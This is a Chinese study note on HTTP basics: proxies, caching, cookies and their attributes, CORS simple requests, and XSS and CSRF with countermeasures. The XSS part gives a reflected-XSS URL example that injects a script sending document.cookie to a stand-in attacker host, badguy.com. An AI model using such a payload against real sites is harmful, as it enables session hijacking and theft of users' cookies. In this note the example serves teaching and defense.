

# http
- 网络通讯协议

### 客户端user-agent
- 可以为用户发起网络请求的工具，大部分由浏览器扮演

### web服务器
- 请求的另一端，可以是一个服务器组成的集群，也可以是一个向其他计算机请求的软件

### proxy
- 请求中，在应用层转发了http信息的程序，我们叫做代理，表现的功能有
- 缓存，过滤，负载均衡，权限控制，登录存储历史信息

### http性质
-  1.  简单，可添加
-  2.  http无状态，有会话
-  3.  两次请求没有必然联系（除非加入cookies，创建一个会话共享上下文信息）

### 浏览器缓存
- 适用于：定期或者频繁更新的资源
- 客户端和浏览器端规约一个缓存时间
- 利用cache-control，expires，last-modified等计算过期时间

### 资源加速
- 适用于：长期不更新，但是一旦更新就希望尽快上线
- 使用时在文件名后面加上一个版本号，或者hash，时间戳等等

### cookies
- cookies使http记录状态变成了可能，主要作用：
- 会话状态管理
- 个性化设置
- 浏览器行为跟踪

### 创建cookies
```js
response.setHeader('Set-Cookie', ['type=ninja', 'language=javascript']);
```
- 创建cookie后，对该服务器的每一次请求，浏览器都会将之前保存的cookie发送给服务器

### 会话期cookie
- 不需要指定过期时间和有效期

### 持久cookie
- 可以指定一个有效期和有效时间

### Secure; HttpOnly
- 这样设置了，cookie就无法被客户端js所调用

### cookie的作用域
- 通过domain和path来指定主机名和url路径

### js访问cookie
```js
document.cookie = 'tastyCookie=strawberry'
```








## 安全问题

### 会话劫持和XSS
XSS攻击就是攻击者在网页中嵌入恶意脚本，前提是盗取cookie

那么如何嵌入脚本呢：
- Reflected
  <%Reequest.QueryString("term")%>
  在http://victim.com/search.asp后面附上
  http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>

防止方法：
- 设置httpOnly，防止cookie被盗取
- 加入ip或者user-agent进行对比
- web app

### 跨站请求伪造CSRF
当用户登录A网站后，钓鱼网站通过诱导用户点击图片链接，来想A网站发送请求。
由于用户已经登录A，cookie等信息随着请求过去，后台无法分辨
CSRF攻击就是提用户发起请求，前提是不知道cookie

防止方法：
- 通过token来校验用户提交
- 修改删除都通过post请求
- 不要暴露用户隐私信息



## CORS跨域资源共享
> 跨域拦截不一定是浏览器限制了网络请求，也可能是请求成功，返回参数被浏览器拦截了

### 简单请求

- 请求类型
    GET; POST; HEAD

- 规定了只能设置部分字段
    Accept
    Accept-Language
    Content-Type 

- Content-Type类型
    text/plain
    multipart/form-data
    application/x-www-form-urldecoded



